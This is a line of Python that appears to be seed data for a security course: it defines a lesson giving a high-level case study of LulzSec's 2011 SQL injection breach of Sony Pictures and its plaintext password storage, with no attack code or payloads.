    l7_2 = Lesson(module_id=m7.id, order_index=2, title="Case Study: Sony Pictures (2011)", narrative="**Narrative**: *In 2011, the hacktivist group LulzSec compromised Sony Pictures using one of the simplest SQL injection techniques.*\\n**The Facts**:\\n**LulzSec's public statement** (paraphrased):\\n> *\"We used a simple SQL injection — one of the most basic and well-known vulnerabilities. The fact that Sony was storing passwords in plaintext shows a complete disregard for security.\"*\\n**Double failure**:\\n1. **Vulnerable to SQL injection** — a preventable bug\\n2. **Plaintext passwords** — no hashing or encryption", code_snippet=None, code_language=None, table_data=None)
